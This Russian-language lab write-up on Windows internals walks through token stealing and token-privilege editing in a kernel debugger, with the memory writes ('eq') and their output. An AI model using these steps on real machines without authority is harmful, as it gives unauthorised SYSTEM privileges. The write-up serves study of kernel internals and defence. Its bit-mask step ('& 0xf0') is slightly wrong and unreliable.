---
title: Абуз токенов для повышения привилегий
published: true
tags: [ "windows", "internals", "lab" ]
image: /assets/previews/3.jpg
layout: page
pagination: 
  enabled: true
---

Будут рассмотрены две техники:

1) Кража/подмена токена - низкоуровневый токен подменяется высокоуровневым

2) Корректирование привилегий токена - добавление привилегий текущему токену

Новая ядерная структура - \_TOKEN

### [](#header-3)Попробуем сначала первый способ:

Берём токен процесса System, заменяем свой системным, профит

```js
kd> dt nt!_EPROCESS fffffa800372cb00
...
   +0x208 Token            : _EX_FAST_REF
...

kd> dq fffffa800372cb00+0x208 L1
fffffa80`0372cd08  fffff8a0`01b46a5b

kd> !token fffffa800372cb00+0x208
The address 0xfffffa80038fe4a8 does not point to a token object.

kd> dt _EX_FAST_REF
ntdll!_EX_FAST_REF
   +0x000 Object           : Ptr64 Void
   +0x000 RefCnt           : Pos 0, 4 Bits
   +0x000 Value            : Uint8B
   
kd> dt _EX_FAST_REF   
ntdll!_EX_FAST_REF
   +0x000 Object           : 0xfffff8a0`01b46a5b Void
   +0x000 RefCnt           : 0y1011
   +0x000 Value            : 0xfffff8a0`01b46a5b
```

Выходит, что последние 4 бита - это счётчик референсов, уберём их, получим адрес токена:
0xfffff8a0\`01b46a5b & 0xf0 --> 0xfffff8a0\`01b46a50

```js
kd> !token 0xfffff8a0`01b46a50
_TOKEN 0xfffff8a001b46a50
TS Session ID: 0x1
User: S-1-5-21-2382729903-2716558127-3398458678-1003
User Groups: 
 00 S-1-5-21-2382729903-2716558127-3398458678-513
    Attributes - Mandatory Default Enabled 
 01 S-1-1-0
    Attributes - Mandatory Default Enabled 
 02 S-1-5-21-2382729903-2716558127-3398458678-1000
    Attributes - Mandatory Default Enabled 
 03 S-1-5-32-545
    Attributes - Mandatory Default Enabled 
 04 S-1-5-4
    Attributes - Mandatory Default Enabled 
 05 S-1-2-1
    Attributes - Mandatory Default Enabled 
 06 S-1-5-11
    Attributes - Mandatory Default Enabled 
 07 S-1-5-15
    Attributes - Mandatory Default Enabled 
 08 S-1-5-113
    Attributes - Mandatory Default Enabled 
 09 S-1-5-5-0-112295
    Attributes - Mandatory Default Enabled LogonId 
 10 S-1-2-0
    Attributes - Mandatory Default Enabled 
 11 S-1-5-64-10
    Attributes - Mandatory Default Enabled 
 12 S-1-16-8192
    Attributes - GroupIntegrity GroupIntegrityEnabled 
Primary Group: S-1-5-21-2382729903-2716558127-3398458678-513
Privs: 
 19 0x000000013 SeShutdownPrivilege               Attributes - 
 23 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled Default 
 25 0x000000019 SeUndockPrivilege                 Attributes - 
 33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes - 
 34 0x000000022 SeTimeZonePrivilege               Attributes - 
Authentication ID:         (0,1b6e2)
Impersonation Level:       Anonymous
TokenType:                 Primary
Source: User32             TokenFlags: 0x2200 ( Token in use )
Token ID: 4bdf2            ParentToken ID: 0
Modified ID:               (0, 4b6ff)
RestrictedSidCount: 0      RestrictedSids: 0x0000000000000000
OriginatingLogonSession: 3e7
```

Его же мы получим, если сделаем

```js
kd> !process fffffa800372cb00 1
PROCESS fffffa800372cb00
    SessionId: 1  Cid: 0928    Peb: 7fffffde000  ParentCid: 07f0
    DirBase: 68d15000  ObjectTable: fffff8a000d3a940  HandleCount: 271.
    Image: powershell.exe
    VadRoot fffffa800691fd80 Vads 234 Clone 0 Private 8427. Modified 22. Locked 0.
    DeviceMap fffff8a0013e5b40
    Token                             fffff8a001b46a50
    ElapsedTime                       00:00:06.874
    UserTime                          00:00:00.250
    KernelTime                        00:00:00.015
    QuotaPoolUsage[PagedPool]         304952
    QuotaPoolUsage[NonPagedPool]      28324
    Working Set Sizes (now,min,max)  (15169, 50, 345) (60676KB, 200KB, 1380KB)
    PeakWorkingSetSize                16026
    VirtualSize                       553 Mb
    PeakVirtualSize                   565 Mb
    PageFaultCount                    46113
    MemoryPriority                    FOREGROUND
    BasePriority                      8
    CommitCharge                      13117
```

```kd> eq fffffa800372cb00+0x208 fffff8a000004040```

![WhoAmI Structure](/assets/whoami.png)

### [](#header-3)Второй способ

Заберём права токена процесса System себе

![WhoAmIPriv Structure](/assets/whoamipriv.png)

```js
kd> !token fffff8a0022b7060
_TOKEN 0xfffff8a0022b7060
TS Session ID: 0x1
User: S-1-5-21-2382729903-2716558127-3398458678-1003
User Groups: 
 00 S-1-5-21-2382729903-2716558127-3398458678-513
    Attributes - Mandatory Default Enabled 
 01 S-1-1-0
    Attributes - Mandatory Default Enabled 
 02 S-1-5-21-2382729903-2716558127-3398458678-1000
    Attributes - Mandatory Default Enabled 
 03 S-1-5-32-545
    Attributes - Mandatory Default Enabled 
 04 S-1-5-4
    Attributes - Mandatory Default Enabled 
 05 S-1-2-1
    Attributes - Mandatory Default Enabled 
 06 S-1-5-11
    Attributes - Mandatory Default Enabled 
 07 S-1-5-15
    Attributes - Mandatory Default Enabled 
 08 S-1-5-113
    Attributes - Mandatory Default Enabled 
 09 S-1-5-5-0-112295
    Attributes - Mandatory Default Enabled LogonId 
 10 S-1-2-0
    Attributes - Mandatory Default Enabled 
 11 S-1-5-64-10
    Attributes - Mandatory Default Enabled 
 12 S-1-16-8192
    Attributes - GroupIntegrity GroupIntegrityEnabled 
Primary Group: S-1-5-21-2382729903-2716558127-3398458678-513
Privs: 
 19 0x000000013 SeShutdownPrivilege               Attributes - 
 23 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled Default 
 25 0x000000019 SeUndockPrivilege                 Attributes - 
 33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes - 
 34 0x000000022 SeTimeZonePrivilege               Attributes - 
Authentication ID:         (0,1b6e2)
Impersonation Level:       Anonymous
TokenType:                 Primary
Source: User32             TokenFlags: 0x2200 ( Token in use )
Token ID: 70533            ParentToken ID: 0
Modified ID:               (0, 70234)
RestrictedSidCount: 0      RestrictedSids: 0x0000000000000000
OriginatingLogonSession: 3e7
```

Видим те же права у токена, что и на картинке
Токен системы:

```js
kd> !token fffff8a000004040
_TOKEN 0xfffff8a000004040
TS Session ID: 0
User: S-1-5-18
User Groups: 
 00 S-1-5-32-544
    Attributes - Default Enabled Owner 
 01 S-1-1-0
    Attributes - Mandatory Default Enabled 
 02 S-1-5-11
    Attributes - Mandatory Default Enabled 
 03 S-1-16-16384
    Attributes - GroupIntegrity GroupIntegrityEnabled 
Primary Group: S-1-5-18
Privs: 
 02 0x000000002 SeCreateTokenPrivilege            Attributes - 
 03 0x000000003 SeAssignPrimaryTokenPrivilege     Attributes - 
 04 0x000000004 SeLockMemoryPrivilege             Attributes - Enabled Default 
 05 0x000000005 SeIncreaseQuotaPrivilege          Attributes - 
 07 0x000000007 SeTcbPrivilege                    Attributes - Enabled Default 
 08 0x000000008 SeSecurityPrivilege               Attributes - 
 09 0x000000009 SeTakeOwnershipPrivilege          Attributes - 
 10 0x00000000a SeLoadDriverPrivilege             Attributes - 
 11 0x00000000b SeSystemProfilePrivilege          Attributes - Enabled Default 
 12 0x00000000c SeSystemtimePrivilege             Attributes - 
 13 0x00000000d SeProfileSingleProcessPrivilege   Attributes - Enabled Default 
 14 0x00000000e SeIncreaseBasePriorityPrivilege   Attributes - Enabled Default 
 15 0x00000000f SeCreatePagefilePrivilege         Attributes - Enabled Default 
 16 0x000000010 SeCreatePermanentPrivilege        Attributes - Enabled Default 
 17 0x000000011 SeBackupPrivilege                 Attributes - 
 18 0x000000012 SeRestorePrivilege                Attributes - 
 19 0x000000013 SeShutdownPrivilege               Attributes - 
 20 0x000000014 SeDebugPrivilege                  Attributes - Enabled Default 
 21 0x000000015 SeAuditPrivilege                  Attributes - Enabled Default 
 22 0x000000016 SeSystemEnvironmentPrivilege      Attributes - 
 23 0x000000017 SeChangeNotifyPrivilege           Attributes - Enabled Default 
 25 0x000000019 SeUndockPrivilege                 Attributes - 
 28 0x00000001c SeManageVolumePrivilege           Attributes - 
 29 0x00000001d SeImpersonatePrivilege            Attributes - Enabled Default 
 30 0x00000001e SeCreateGlobalPrivilege           Attributes - Enabled Default 
 31 0x00000001f SeTrustedCredManAccessPrivilege   Attributes - 
 32 0x000000020 SeRelabelPrivilege                Attributes - 
 33 0x000000021 SeIncreaseWorkingSetPrivilege     Attributes - Enabled Default 
 34 0x000000022 SeTimeZonePrivilege               Attributes - Enabled Default 
 35 0x000000023 SeCreateSymbolicLinkPrivilege     Attributes - Enabled Default 
Authentication ID:         (0,3e7)
Impersonation Level:       Anonymous
TokenType:                 Primary
Source: *SYSTEM*           TokenFlags: 0x2000 ( Token NOT in use ) 
Token ID: 3eb              ParentToken ID: 0
Modified ID:               (0, 3ec)
RestrictedSidCount: 0      RestrictedSids: 0x0000000000000000
OriginatingLogonSession: 0
```

```js
kd> dt _token
nt!_TOKEN
...
   +0x040 Privileges       : _SEP_TOKEN_PRIVILEGES
...

powershell process
kd> dt _sep_token_privileges fffff8a0022b7060+0x40
nt!_SEP_TOKEN_PRIVILEGES
   +0x000 Present          : 0x00000006`02880000
   +0x008 Enabled          : 0x800000
   +0x010 EnabledByDefault : 0x800000
   
System process
kd> dt _sep_token_privileges fffff8a000004040+0x40
nt!_SEP_TOKEN_PRIVILEGES
   +0x000 Present          : 0x0000000f`f2ffffbc
   +0x008 Enabled          : 0x0000000e`60b1e890
   +0x010 EnabledByDefault : 0x0000000e`60b1e890
```

![allprivileges Structure](/assets/allprivileges.png)

```js
eq fffff8a0022b7060+0x40 0x0000000f`f2ffffbc
eq fffff8a0022b7060+0x40+8 0x0000000f`f2ffffbc

kd> dt _sep_token_privileges fffff8a0022b7060+0x40
nt!_SEP_TOKEN_PRIVILEGES
   +0x000 Present          : 0x0000000f`f2ffffbc
   +0x008 Enabled          : 0x0000000f`f2ffffbc
   +0x010 EnabledByDefault : 0x800000
```
